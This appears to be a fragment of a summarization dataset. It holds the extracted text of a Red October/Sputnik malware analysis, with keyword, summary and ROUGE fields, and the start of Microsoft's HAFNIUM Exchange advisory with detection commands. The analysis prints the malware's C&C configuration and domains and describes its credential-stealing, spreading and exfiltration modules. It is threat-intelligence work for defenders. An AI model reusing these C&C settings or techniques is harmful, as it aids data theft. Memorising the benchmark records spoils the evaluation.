Once connected, infect the phone with a mobile version of the Sputnik main component Wait for a specially crafted Microsoft Office or PDF document and execute a malicious payload embedded in that document, implementing a one-way covert channel of communication that can be used to restore control of the infected machine Record all the keystrokes, make screenshots Execute additional encrypted modules according to a pre-defined schedule Retrieve e-mail messages and attachments from Microsoft Outlook and from reachable mail servers using previously obtained credentialsOne-time tasksCollect general software and hardware environment information1/16Collect filesystem and network share information, build directory listings, search and retrieve files by mask provided by the C&C server Collect information about installed software, most notably Oracle DB, RAdmin, IM software including Mail.Ru agent, drivers and software for Windows Mobile, Nokia, SonyEricsson, HTC, Android phones, USB drives Extract browsing history from Chrome, Firefox, Internet Explorer, Opera Extract saved passwords for Web sites, FTP servers, mail and IM accounts Extract Windows account hashes, most likely for offline cracking Extract Outlook account information Determine the external IP address of the infected machine Download files from FTP servers that are reachable from the infected machine (including those that are connected to its local network) using previously obtained credentials Write and/or execute arbitrary code provided within the task Perform a network scan, dump configuration data from Cisco devices if available Perform a network scan within a predefined range and replicate to vulnerable machines using the MS08-067 vulnerability Replicate via network using previously obtained administrative credentialsModule GroupsGroup nameReconPasswordEmailUSB driveDescritionModules of this group designed to be used during first stage of cyberattack right after initial infiltration. Their main purpose is to collect general information about target system which helps locate and identify the infected machine, estimate potential value of current computer data and define which other modules should be pushed next. Also, these modules collect initial easy-to-get type of information such as browser history, browser cached credentials and FTP client settings.This group of modules is designed to steal credentials from various applications and resources, from Mail.ru Agent (popupal free app from mail.ru) to MS Outlook credentials and Windows account hashes (including cached Windows Domain account hashes). Capable of using low-level and direct disk access to copy protected files.This group serves stealing emails from local MS Outlook storage or remote POP3/IMAP mail server. It\u2019s capable of dumping full email bodies with headers, saving attachments with predefined file extensions.This group is used to steal files from attached USB devices. It monitors USB device events and starts every time new device is attached. It can copy files from predefined extension list, size and age. This group capable of recognition, restoration and copying already deleted files of MS Office document formats by using own FAT-based filesystem parser.KeyboardThis group is dedicated to recording keystrokes, grabbing text from password input fields and making screencaptures.Persistence Current group contains installer and payload code to plant a plugin in popularapplications such as MS Office or Adobe Reader. The backdoor code is activated when specially crafted document is opened on target machine. This is used to regain lost access on a machine in case of unexpected loss of control (C&C server takedown or local malware cleaning).2/16SpreadingMobileModules of this group are used to scan for other hosts on the network, fingerprint them and then infect via MS08-067 or a list of stolen admin credentials. A module from this group is capable of dumping Cisco network router configuration via SNMP commands and embedded TFTP server.Mobile group is used to dump all valuable information about locally attached mobile device. It is capable of copying contact information, calendars, SMS and Emails databases and many other private data. These modules are capable of checking if a device was jailbroken.Exfiltration While some of other modules work in \u201coffline\u201d mode, collect and store data locally, this group of modules transfers all collected data to the C&C server. Modules of this group are capable of reaching FTP servers, remote network shares as well as local disk drives and copy files from these resources. Unlike Recon data collection modules these modules are designed to run repeatedly and bring only new valuable data.Missing ModulesGroup nameUSB InfectionDescritionThere are modules that copy data files (such as execution logs) related to current malware family from USB drives. However, we haven\u2019t seen a module to infect the USB drives yet. We suspect that this module is capable of infecting removable storage, running arbitrary application launch timestamps, enumerates attached usb devices like mobile phones and looks for software from this devices, checks for presence of custom enterprise software, maintains unfinished/unreferenced download+execute functionality, sends encrypted collected data at one of C&C servers (i.e. nt-windows-online.com;nt-windows- update.com;nt-windows-check.com). This module is a Win32 Dll file. C runtime and several other libs statically linked into the executable with various optimizations enabled. All functionality is in DllMain function, no export names defined. Compiled with MS Visual C++ 2005.Sequence of systems monitoring tasks1. Gathers startup information, select environment variables and values %windir%,%username%, %userdomain%, %computername%)2. Opens target directory c:windowsprefetch, records all entries in the directory ofapplications recently run along with timestamp, i.e. PREFETCH DEFRAG.EXE-273F131E.pf.2012-10-31 18:32:37 PREFETCH DUMPBIN.EXE-0751B17C.pf.2012-11-01 23:45:393. Loops through registry, attempts to access and record all recently used applicationdata, i.e. C:Program FilesCommon FilesJavaJava Updatejusched.exe, REG_SZ, Java(TM) Update Scheduler C:Documents and SettingspLocal SettingsApplication DataGoogleUpdateGoogleUpdate.exe, REG_SZ, Google Installer C:Program FilesMessengermsmsgs.exe, REG_SZ, Windows Messenger4. Attempts to access and record a set of hardcoded registry keys related to enterprisesoftware. Attempts to access and record related keys and values. Reports on success and failure of related key and value access, i.e. REG ORACLE* CHECK (1) SoftwareOracleSun RayClientInfoAgentDisconnectActions@Default -> REG_SZ:\u201d\u201d (1) SoftwareOracleSun RayClientInfoAgentReconnectActions @Default -> REG_SZ:\u201d\u201d5. Attempts to access and record all registry keys and values related to context menuhandlers and related executable pathnames, i.e. Context MENU *shellexContextMenuHandlers7-Zip (1) *shellexContextMenuHandlers7-Zip@Default -> REG_SZ: \u201c{23170F69-40C1-278A- 1000-000100020000}\u201d (1) CLSID{23170F69-40C1-278A-1000-000100020000}@Default -> REG_SZ: \u201c7-Zip ShellExtension\u201d (1) CLSID{23170F69-40C1-278A-1000-000100020000}InprocServer32@Default -> REG_SZ: \u201cC:Program Files7-Zip7-zip.dll\u201d (2) CLSID{23170F69-40C1-278A-1000-5/16000100020000}InprocServer32ThreadingModel -> REG_SZ: \u201cApartment\u201d6. Attempts to access and record registry keys and values related to auto-startapplications enumerated under the HKCU Run key and all HKLMUserinit registry keys, REG_SZ: \u201cC:WINDOWSsystem32VBoxTray.exe\u201d (2) SOFTWAREMicrosoftWindowsCurrentVersionRunSunJavaUpdateSched \u2013 > REG_SZ: \u201cC:Program FilesCommon FilesJavaJava Updatejusched.exe\u201d7. Attempts to access and record registry keys and values enabling email and webmailaccess under HKCUSoftwareVB and VBA Program SettingsWebmailer, MSOffice settings, and HKCUSoftwareMail.ruAgentAgent, i.e. REG_MRA Run (1) SoftwareMail.RuAgentAgent -> REG_SZ: \u201c1\u201d8. Attempts to access and record registry keys and values related to hardcoded list of attached mobile devices and also general USB devices and mobile synchronization and contact software. Reports on success and failure of related key and value access, i.e. N2 Run ERROR: can\u2019t make RegOpenKey for SoftwareNokiaPC Suite at 412: 0 MSG: The operation completed successfully9. Attempts to access and record registry keys and values related to list of all installedsoftware. Reports on success and failure of related key and value access, i.e. EE4AB9A00CB3B5D2472ProductName -> REG_SZ: \u201cWebFldrs XP\u201d10. Attempts to access and record registry keys and values indicating the presence ofRadmin v2.0 remote control software, i.e. Radmin Run ERROR: can\u2019t make RegOpenKey for SYSTEMRAdminv2.0ServerParameters at 412: 0 MSG: The operation completed successfully11. Attempts to open Firefox prefs.js and profiles.ini configuration files. Attempts to open Opera profile.ini, profile/Opera6.ini configuration files. Reads these files and identifies network proxies for each along with credential information. Retrieves Internet Explorer proxy preferences from the registry.12. Searches for the following file types in the registry and corresponding handler and6/16attempts to record related data for the following extensions:.str.tte._ok.ki.tel.tlg .zfc.encrypted.zm9.dat.crp .pcr.safe.ldfAs a part of the network activity loop, calls GetWindowsDirectoryA, GetDriveTypeA and GetVolumeInformation each time, collects hardware information most likely for unique identification. Attempts to resolve nt-windows-update.com domain name. Following a successful call and return from WS2_32.WSAStartup and prior to WS2_32.gethostbyname, the collected data is encrypted. Attempts to connect to nt-windows-online.com. POSTs encrypted data to nt- windows-online.com/cgi-bin/nt/sk/ . If POST to nt-windows-online.com fails, attempts the same process with nt-windows- check.com, nt-windows-update.com domains. If no connections are made, attempts to use configured web browser proxy settings and uses them to connect to the three hard-coded domains listed above. Connects and POSTs the stolen configuration data. Maintains download and execute code. How this functionality is called at runtime is uncertain. There are no references to it at runtime, so it seems like something is missing or unfinished.Hardcoded registry keys:HKCUSoftwareMicrosoftWindowsShellNoRoamMUICache HKCUSOFTWAREVB and VBA Program SettingsWebMailer HKCUSOFTWAREMicrosoftWindows CE Services HKLMSystemCurrentControlSetControlDeviceClasses7/16HKCRSonyEricsson.PCCompanion.1CLSID 2010. Known samples share one code section, but contain different payloads in the resource section. All the functionality is implemented in the DllMain function.This module is a plugin to check Internet connectivity and get an external IP address of current system using popular public services such as 2ip.ru, myip.ru, smart-ip.net.DllMainThe module collects basic system information such as current computer name, current username, and path to the original executable module where it started from. It creates a unique identifier of current system based on VolumeSerialNumber property of the disk where current Windows system is located or a hash of current computer name and ProductID value of Internet Explorer fromHKLMSOFTWAREMicrosoftInternet ExplorerRegistrationProductID. This information is put in the log file in the first place along with current date and time.This module loads a config/script from local resource AAA and sends out some network requests using standard WinInet API. The config/script AAA has the following contents:SetOption(conn_a.D_CONN, [65] \u201cnt-windows-online.com;nt-windows-update.com;nt- windows-check.com\u201d) SetOption(conn_a.D_NAME, [15] \u201c/cgi-bin/nt/sk\u201d) SetOption(conn_a.D_RPRT, [3] \u201c80\u201d) SetOption(conn_a.D_SPRT, [3] \u201c80\u201d) SetOption(conn_a.D_USER, [21] \u201c%removed%\u201d) SetOption(conn_a.D_MODE, 0x0033) SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.J_CONN, [65] \u201cnt-windows-online.com;nt-windows-update.com;nt- windows-check.com\u201d) SetOption(conn_a.J_NAME, [15] \u201c/cgi-bin/nt/th\u201d) SetOption(conn_a.J_USER, [21] \u201c%removed%\u201d)8/16SetOption(conn_a.J_RPRT, [3] \u201c80\u201d) SetOption(conn_a.J_SPRT, [3] \u201c80\u201d) SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.VERSION_ID, [6] \u201c51070\u201d) SetOption(conn_a.SEND_DELAY_TIME, [6] \u201c20000\u201d) SetOption(conn_a.VER_SESSION_ID, [11] \u201c%removed%\u201d) SetOption(http_host, [7] \u201c2ip.ru\u201c) SetOption(http_port, [3] \u201c80\u201d) SetOption(http_path, 0x002F) SetOption(http_ua, [68] \u201cMozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\u201d) SetOption(http_headers, [177] \u201cAccept: text/html,application/xhtml+xml,application/xml;q=0.9, */*;q=0.8 Accept-Language: en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Accept-Charset: utf-8;q=0.7,*;q=0.7\u201d) Call(task_http) SetOption(http_host, [12] \u201cwww.myip.ru\u201c) SetOption(http_port, [3] \u201c80\u201d) SetOption(http_path, 0x002F) SetOption(http_ua, [68] \u201cMozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\u201d) SetOption(http_headers, [177] \u201cAccept: text/html,application/xhtml+xml,application/xml;q=0.9, */*;q=0.8 Accept-Language: en-us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Accept- Charset: utf-8;q=0.7,*;q=0.7\u201d) Call(task_http) SetOption(http_host, [13] \u201csmart-ip.net\u201c) SetOption(http_port, [3] \u201c80\u201d) SetOption(http_path, 0x002F) SetOption(http_ua, [68] \u201cMozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\u201d) SetOption(http_headers, [177] \u201cAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en- us;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflate Accept-Charset: utf-8;q=0.7,*;q=0.7\u201d) Call(task_http)While \u201cconn_a\u201d parameters are used to access C&C server during reporting stage, other parameters which start with \u201chttp_\u201d are used to send out http requests. Target hosts as shown above are1. 2ip.ru 2. www.myip.ru 3. smart-ip.net9/16The websites are used to get current IP address as it is visible on the Internet. If the machine is behind proxy or NAT router, the IP address might be different from the local one. Interestingly all websites of current module developers\u2019 choice are obviously owned by Russian-speaking people from former CIS countries, first two seem to be Russian and last one is Ukrainian.The module simply sends HTTP GET requests to the root page of the websites and gets the response code from the headers as well as html/text source of the webpage, which is later uploaded to the C&C.Current module doesn\u2019t create any local logs, instead all information is kept in memory, which is later compressed using Zlib 1.2.5, encrypted, encoded with Base64 algorithm and data) \u2013 code is identical.This module is a PE DLL, written in C++, compiled with Microsoft Visual Studio 2010.DLL resides only in memory \u2013 it does not drop itself or any other executables to the disk.It creates%USERPROFILE%Local SettingsTemptmpXX.tmp file (where XX is randomly generated hex number). During the analysis, the file stayed 0-bytes. Most probably, it\u2019s created for further data logs.DLL collects a range of information about the computer (including the browsers history). This data is written to the memory, compressed with Zlib deflate() function \u2013 which also performs some XOR operations on it \u2013 encoded with base64 algorithm and sent by the HTTP POST request to the C&C server.InitializationAfter it is loaded to the memory, malware loads and locks resource BBB:AAA:0000, which contains config information;It gets the information about local system and current process:computer name user name current module name10/16pidThen it creates a separate thread, which contains the main module functionality.Main malware threadFirst, it constructs an internal filename string \u201c @INFOSYSINFO_%u_%s.bin\u201cwhere %u is equal to 7 and %s is system time \u2013 obtained with use of GetLocalTime and SystemTimeToFileTime \u2013 in format:\u201c%04u%02u%02u_%02u%02u%02u_%03u\u201dif FileTimeToSystemTime failed, it uses the default time string:\u201c16010101_000000_000\u201dif wsprintfW failed, it uses the default hardcoded filename:\u201c@INFOSYSINFO_X_00000000_000000_000.txt\u201dThen it reads the configuration from the resources section and builds the structure containing all the necessary information at specific offsets. This structure is held only in memory.It contains a resource named \u201cAAA\u201d with the following values in it:SetOption(conn_a.D_CONN, [65] \u201cnt-windows-online.com;nt-windows-update.com;nt- windows-check.com\u201d) SetOption(conn_a.D_NAME, [15] \u201c/cgi-bin/nt/sk\u201d) SetOption(conn_a.D_RPRT, [3] \u201c80\u201d) SetOption(conn_a.D_SPRT, [3] \u201c80\u201d) SetOption(conn_a.D_USER, [21] \u201c%removed%\u201d) SetOption(conn_a.D_MODE, 0x0033) SetOption(conn_a.D_PASS, 0x00) SetOption(conn_a.J_CONN, [65] \u201cnt-windows-online.com;nt-windows-update.com;nt- windows-check.com\u201d) SetOption(conn_a.J_NAME, [15] \u201c/cgi-bin/nt/th\u201d) SetOption(conn_a.J_USER, [21] \u201c%removed%\u201d) SetOption(conn_a.J_RPRT, [3] \u201c80\u201d) SetOption(conn_a.J_SPRT, [3] \u201c80\u201d) SetOption(conn_a.J_MODE, 0x0033) SetOption(conn_a.J_PASS, 0x00) SetOption(conn_a.VERSION_ID, [6] \u201c17486\u201d) SetOption(conn_a.SEND_DELAY_TIME, [6] \u201c20000\u201d) SetOption(conn_a.VER_SESSION_ID, [11] \u201c%removed%\u201d) Call(task_sysinfo)Malware main thread calls 2 main subroutines:retrieves a lot of system information, including browsing history, and writes it to the11/16in-memory log takes data from the configuration in resources to connect to the C&C and submit collected dataData collectionMalware collects following information:current file time is admin (if the user has administrative rights) language ansi code package oem code package time zone current module name current directory temp directory path Windows directory path system directory path major OS version minor OS version build number service pack number platform idAdditionally, to obtain default applications for HTTP, HTTPS, HTMLFILE and MAILTO malware uses RegQueryValueEx to check following registry keys underHKCRttpshellopencommand HKCRmailtoshellopencommandFollowing parameters are retrieved for each disk, including optical drives and shared mounts:root path volume serial number filesystem flags maximum component length sectors per cluster bytes per sector number of free clusters12/16number of total clusters free bytes available total number of bytes total number of free bytesThen it collects information about local network adapters:Adapter Name Adapter MAC Address LeaseExpiresThe malware looks for URL history from following browsers:Chrome, Mozilla Firefox, Internet Explorer, Opera1. Chrome history:Before the malware is performing the SQL queries on the browsers profile-files, it copies the original file into a temp-file.To get the Tempfile path and name it makes use of GetTempPathW and GetTempFileNameW with prefix \u201ctmp\u201d.The Tempfile will be named like this:tmpXX.tmpWhere XX is a 2-digit number starting from 00.Malware use following SQL query:SELECT * FROM urlsto extract URLs (with titles, last visited date) from Chrome history database:GoogleChromeUser DataDefaultHistory2. Mozilla history (sub_10015430):13/16Malware use following SQL query:SELECT * FROM moz_placesto extract URLs from Mozilla history database:MozillaFirefoxProfiles%profilename%places.sqliteIn both cases, malware performs SQL related actions with use of functions from embedded SQL library (most probably parts of sqlite3.dll).3. IE history (sub_10014F50):Malware calls CoCreateInstance function with following values:CLSID 3C374A40-BAE4-11CF-BF7D-00AA006946EE Microsoft Url History Service RIID AFA0DC11-C313-11D0-831A-00C04FD5AE38 SID_IUrlHistoryStg2i.e. it uses IUrlHistory interface to search through the history and calls SHDOCVW!CEnumSTATURL to enumerate URLs.It also makes use of shdocvw.dll which is responsible to get control over IE. The call- adresses are resolved dynamically:4. Opera history (sub_10014EB0):Malware gets the Opera folder path and searches it for URLs in files:14/16global_history.dat, global.datAll above subroutines retrieves URL + Title + Last Visited Time and write them to the memory (after the previous data).Also, a DNS resolve is performed on all domain names.This module also calls GetEnvironmentStrings to retrieve all environment variables.It is also interested in current Windows Domain informationDomainControllerName ClientSiteNameThe malware looks for all running processes and all modules loaded into their address space. For each file it retrieves following values from the version info:StringFileInfo%04x%04xSpecialBuild StringFileInfo%04x%04xPrivateBuild StringFileInfo%04x%04xProductVersion StringFileInfo%04x%04xProductName StringFileInfo%04x%04xOriginalFilename StringFileInfo%04x%04xLegalTrademarks StringFileInfo%04x%04xLegalCopyright StringFileInfo%04x%04xInternalName StringFileInfo%04x%04xFileVersion StringFileInfo%04x%04xFileDescription StringFileInfo%04x%04xCompanyNameIt looks for installed programs information by enumerating registry key:SOFTWAREMicrosoftWindowsCurrentVersionUninstallFor each entry it retrieves following values:DisplayName InstallLocation15/16It retrieves information about installed USB devices.Class GUID is hardcoded and equals:{A5DCBF10-6530-11D2-901F-00C04FB951ED}16/16 ", "generated_text": "a framework; modules; Sputnik; First; initial infiltration; the infected machine; information; access; files; system info; access; credentials; Outlook; Microsoft Office; documents; victims; the backdoor code; help; remote access; the attacker; the backdoor; Windows account hashes; the system; use; detection; e-mail; attachments; the victim; the malware; commands; Files; storage; IP; commands; the attacker; victims; the infected machine; the backdoor; activities; persistence; data; network scans; Analysis; C&C server; response; a framework; cipher; the modules; performance; time; analysis; EXE files; analysis.", "ref_text": "<START-1>The PDF describes the second stage of attack used by the Red October malware. Red October is modular malware that is delivered in stages. The first stage gathers reconnaissance on the infected system. The second stage deploys additional modules that steal data, spread the malware, and maintain persistence. The second stage modules are either persistent, running continuously to wait for certain events like a mobile phone connecting, or one-time tasks that run once and collect specific data. Persistent tasks include stealing files from connected USB drives, stealing data from connected phones, spreading via the MS08-067 vulnerability, and more. One-time tasks gather system info, build directory listings, extract browsing history, collect application data, steal Outlook data, and more. The modules are organized into groups based on functionality like reconnaissance, password stealing, email theft, USB infection, spreading, and exfiltration. The modules gather data, encrypt it, and exfiltrate it to command and control servers. The configuration data reveals the command servers and paths used. In summary, the second stage of Red October is modular, persistent malware that builds on the reconnaissance of the first stage to steal data, spread, and maintain control of the infected system. The modular architecture allows the attackers to customize the malware by deploying only certain modules as needed for their goals. <END-1>", "t5/keyword/hint_hit_precision": 0.20754716981132076, "t5/word/hint_hit_recall": 0.07042253521126761, "gpt3/lexical/rouge_rouge1": 0.43478260869565216, "gpt3/lexical/rouge_rouge2": 0.1457725947521866, "gpt3/lexical/rouge_rougeL": 0.24347826086956526, "gpt3/lexical/rouge_rougeLsum": 0.24347826086956526, "gpt3_generated_text": ["The article discusses the detailed malware description of the \"Red October\" cyberattack, focusing on the second stage of the attack. The malware, known as Sputnik, utilizes a framework to execute tasks provided by its command and control servers. These tasks include collecting system information, extracting files, stealing credentials, recording keystrokes, and executing malicious payloads. The malware also has modules for persistence, spreading to other devices on the network, and regaining access through specially crafted documents. The attacker can remotely access the infected machine, steal data, and control the system through encrypted commands. The malware's activities are designed to remain undetected and maintain persistence on the victim's system. The article provides insights into the malware's capabilities and the techniques used by the attackers to compromise victims' systems."]}, {"split_name": "val", "sample_id": "val_70", "prompt_text": "Extract the keywords: 3/12/2021HAFNIUM targeting Exchange Servers with 0-day exploits - Microsoft SecurityHAFNIUM targeting Exchange Servers with 0-day exploitsmicrosoft.com/security/blog/2021/03/02/hafnium-targeting-exchange-serversMarch 2, 2021Update [03/08/2021]: Microsoft continues to see multiple actors taking advantage of unpatched systems to attack organizations with on-premises Exchange Server. To aid defenders in investigating these attacks where Microsoft security products and tooling may not be deployed, we are releasing a feed of observed indicators of compromise (IOCs). The feed of malware hashes and known malicious file paths observed in related attacks is available in both JSON and CSV formats at the below GitHub links. This information is being shared as TLP:WHITE.CSV format JSON formatUpdate [03/05/2021]: Microsoft sees increased use of these vulnerabilities in attacks targeting unpatched systems by multiple malicious actors beyond HAFNIUM. To aid customers in investigating these attacks, Microsoft Security Response Center (MSRC) has provided additional resources, including new mitigation guidance: Microsoft Exchange Server Vulnerabilities Mitigations \u2013 March 2021Update [03/04/2021]: The Exchange Server team released a script for checking HAFNIUM indicators of compromise (IOCs). See Scan Exchange log files for indicators of compromise.Microsoft has detected multiple 0-day exploits being used to attack on-premises versions of Microsoft Exchange Server in limited and targeted attacks. In the attacks observed, the threat actor used these vulnerabilities to access on-premises Exchange servers which enabled access to email accounts, and allowed installation of additional malware to facilitate long-term access to victim environments. Microsoft Threat Intelligence Center (MSTIC) attributes this campaign with high confidence to HAFNIUM, a group assessed to be state-sponsored and operating out of China, based on observed victimology, tactics and procedures.The vulnerabilities recently being exploited were CVE-2021-26855, CVE-2021-26857, CVE-2021-26858, and CVE-2021-27065, all of which were addressed in today\u2019s Microsoft Security Response Center (MSRC) release \u2013 Multiple Security Updates Released for Exchange Server. We strongly urge customers to update on-premises systems immediately. Exchange Online is not affected.We are sharing this information with our customers and the security community to emphasize the critical nature of these vulnerabilities and the importance of patching all affected systems immediately to protect against these exploits and prevent future abuse across the ecosystem. This blog also continues our mission to shine a light on maliciousurl targeting Exchange Servers with 0-day exploits - Microsoft Securityactors and elevate awareness of the sophisticated tactics and techniques used to target our customers. The related IOCs, Azure Sentinel advanced hunting queries, and Microsoft Defender for Endpoint product detections and queries shared in this blog will help SOCs proactively hunt for related activity in their environments and elevate any alerts for remediation.Microsoft would like to thank our industry colleagues at Volexity and Dubex for reporting different parts of the attack chain and their collaboration in the investigation. Volexity has also published a blog post with their analysis. It is this level of proactive communication and intelligence sharing that allows the community to come together to get ahead of attacks before they spread and improve security for all.Who is HAFNIUM?HAFNIUM primarily targets entities in the United States across a number of industry sectors, including infectious disease researchers, law firms, higher education institutions, defense contractors, policy think tanks, and NGOs.HAFNIUM has previously compromised victims by exploiting vulnerabilities in internet- facing servers, and has used legitimate open-source frameworks, like Covenant, for command and control. Once they\u2019ve gained access to a victim network, HAFNIUM typically exfiltrates data to file sharing sites like MEGA.In campaigns unrelated to these vulnerabilities, Microsoft has observed HAFNIUM interacting with victim Office 365 tenants. While they are often unsuccessful in compromising customer accounts, this reconnaissance activity helps the adversary identify more details about their targets\u2019 environments.HAFNIUM operates primarily from leased virtual private servers (VPS) in the United States.Technical detailsMicrosoft is providing the following details to help our customers understand the techniques used by HAFNIUM to exploit these vulnerabilities and enable more effective defense against any future attacks against unpatched systems.CVE-2021-26855 is a server-side request forgery (SSRF) vulnerability in Exchange which allowed the attacker to send arbitrary HTTP requests and authenticate as the Exchange server.CVE-2021-26857 is an insecure deserialization vulnerability in the Unified Messaging service. Insecure deserialization is where untrusted user-controllable data is deserialized by a program. Exploiting this vulnerability gave HAFNIUM the ability to run code as SYSTEM on the Exchange server. This requires administrator permission or another vulnerability to exploit.url targeting Exchange Servers with 0-day exploits - Microsoft SecurityCVE-2021-26858 is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin\u2019s credentials.CVE-2021-27065 is a post-authentication arbitrary file write vulnerability in Exchange. If HAFNIUM could authenticate with the Exchange server then they could use this vulnerability to write a file to any path on the server. They could authenticate by exploiting the CVE-2021-26855 SSRF vulnerability or by compromising a legitimate admin\u2019s credentials.Attack detailsAfter exploiting these vulnerabilities to gain initial access, HAFNIUM operators deployed web shells on the compromised server. Web shells potentially allow attackers to steal data and perform additional malicious actions that lead to further compromise. One example of a web shell deployed by HAFNIUM, written in ASP, is below:Following web shell deployment, HAFNIUM operators performed the following post- exploitation activity:Using Procdump to dump the LSASS process memory:Using 7-Zip to compress stolen data into ZIP files for exfiltration:Adding and using Exchange PowerShell snap-ins to export mailbox data:Using the Nishang Invoke-PowerShellTcpOneLine reverse shell:url targeting Exchange Servers with 0-day exploits - Microsoft SecurityDownloading PowerCat from GitHub, then using it to open a connection to a remote server:HAFNIUM operators were also able to download the Exchange offline address book from compromised systems, which contains information about an organization and its users.Our blog, Defending Exchange servers under attack, offers advice for improving defenses against Exchange server compromise. Customers can also find additional guidance about web shell attacks in our blog Web shell attacks continue to rise.Can I determine if I have been compromised by this activity?The below sections provide indicators of compromise (IOCs), detection guidance, and advanced hunting queries to help customers investigate this activity using Exchange server logs, Azure Sentinel, Microsoft Defender for Endpoint, and Microsoft 365 Defender. We encourage our customers to conduct investigations and implement proactive detections to identify possible prior campaigns and prevent future campaigns that may target their systems.Check patch levels of Exchange ServerThe Microsoft Exchange Server team has published a blog post on these new Security Updates providing a script to get a quick inventory of the patch-level status of on- premises Exchange servers and answer some basic questions around installation of these patches.Scan Exchange log files for indicators of compromiseThe Exchange Server team has created a script to run a check for HAFNIUM IOCs to address performance and memory concerns. That script is available here: url exploitation can be detected via the following Exchange HttpProxy logs:These logs are located in the following directory: %PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy Exploitation can be identified by searching for log entries where the AuthenticatedUser is empty and the AnchorMailbox contains the pattern of ServerInfo~*/*Here is an example PowerShell command to find these log entries:Import-Csv -Path (Get-ChildItem -Recurse -Path \"$env:PROGRAMFILES\\Microsoft\\Exchange Server\\V15\\Logging\\HttpProxy\" - Filter '*.log').FullName | Where-Object { $_.AnchorMailbox -likeurl targeting Exchange Servers with 0-day exploits - Microsoft Security'ServerInfo~*/*' -or $_.BackEndCookie -like 'Server~*/*~*'} | select DateTime, AnchorMailbox, UrlStem, RoutingHint, ErrorCode, TargetServerVersion, BackEndCookie, GenericInfo, GenericErrors, UrlHost, Protocol, Method, RoutingType, AuthenticationType, ServerHostName, HttpStatus, BackEndStatus, UserAgentIf activity is detected, the logs specific to the application specified in the AnchorMailbox path can be used to help determine what actions were taken. These logs are located in the %PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging directory.CVE-2021-26858 exploitation can be detected via the Exchange log files:C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\OABGeneratorLog Files should only be downloaded to the %PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\ClientAccess\\OAB\\Temp directoryIn case of exploitation, files are downloaded to other directories (UNC or local paths)Windows command to search for potential exploitation:findstr /snip /c:\"Download failed and temporary file\" \"%PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\Logging\\OABGeneratorLog\\*.log\"CVE-2021-26857 exploitation can be detected via the Windows Application event logsExploitation of this deserialization bug will create Application events with the following properties:Source: MSExchange Unified Messaging EntryType: Error Event Message Contains: System.InvalidCastExceptionFollowing is PowerShell command to query the Application Event Log for these log entries:Get-EventLog -LogName Application -Source \"MSExchange Unified Messaging\" -EntryType Error | Where-Object { $_.Message -like \"*System.InvalidCastException*\" }CVE-2021-27065 exploitation can be detected via the following Exchange log files:C:\\Program Files\\Microsoft\\Exchange Server\\V15\\Logging\\ECP\\ServerAll Set-<AppName>VirtualDirectory properties should never contain script. InternalUrl and ExternalUrl should only be valid Uris.Following is a PowerShell command to search for potential exploitation:Select-String -Path \"$env:PROGRAMFILES\\Microsoft\\Exchange Server\\V15\\Logging\\ECP\\Server\\*.log\" -Pattern 'Set-.+VirtualDirectory'url targeting Exchange Servers with 0-day exploits - Microsoft SecurityHost IOCsMicrosoft is releasing a feed of observed indicators of compromise (IOCs) in related attacks. This feed is available in both CSV and JSON formats. This information is being C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\ In Microsoft Exchange Server installation paths such as:%PROGRAMFILES%\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ C:\\Exchange\\FrontEnd\\HttpProxy\\owa\\auth\\The web shells we detected had the following file names:web.aspx one.aspxurl targeting Exchange Servers with 0-day exploits - Microsoft SecurityCheck for suspicious .zip, .rar, and .7z files in C:\\ProgramData\\, which may indicate possible data exfiltration.Customers should monitor these paths for LSASS dumps:C:\\windows\\temp\\ C:\\root\\ToolsProcdump Nishang PowerCatMany of the following detections are for post-breach techniques used by HAFNIUM. So while these help detect some of the specific current attacks that Microsoft has observed it remains very important to apply the recently released updates for CVE-2021-26855, CVE- 2021-26857, CVE-2021-27065 and CVE-2021-26858.Microsoft Defender Antivirus detectionsPlease note that some of these detections are generic detections and not unique to this campaign or these exploits.Exploit:Script/Exmann.A!dha Behavior:Win32/Exmann.A Backdoor:ASP/SecChecker.A Backdoor:JS/Webshell (not unique) Trojan:JS/Chopper!dha (not unique) Behavior:Win32/DumpLsass.A!attk (not unique) Backdoor:HTML/TwoFaceVar.B (not unique)Microsoft Defender for Endpoint detectionsSuspicious Exchange UM process creation Suspicious Exchange UM file creation Possible web shell installation (not unique) Process memory dump (not unique)Azure Sentinel detectionsAdvanced hunting queriesTo locate possible exploitation activity related to the contents of this blog, you can run the following advanced hunting queries via Microsoft Defender for Endpoint and Azure Sentinel:url targeting Exchange Servers with 0-day exploits - Microsoft SecurityMicrosoft Defender for Endpoint advanced hunting queriesMicrosoft 365 Defender customers can find related hunting queries below or at this GitHub location: url Queries/Additional queries and information are available via Threat Analytics portal for Microsoft Defender customers.UMWorkerProcess.exe in Exchange creating abnormal contentLook for Microsoft Exchange Server\u2019s Unified Messaging service creating non-standard content on disk, which could indicate web shells or other malicious content, suggesting exploitation of CVE-2021-26858 vulnerability:DeviceFileEvents | where InitiatingProcessFileName == \"UMWorkerProcess.exe\" | where FileName != \"CacheCleanup.bin\" | where FileName !endswith \".txt\" | where FileName !endswith \".LOG\" | where FileName !endswith \".cfg\" | where FileName != \"cleanup.bin\"UMWorkerProcess.exe spawningLook for Microsoft Exchange Server\u2019s Unified Messaging service spawning abnormal subprocesses, suggesting exploitation of CVE-2021-26857 vulnerability:DeviceProcessEvents | where InitiatingProcessFileName == \"UMWorkerProcess.exe\" 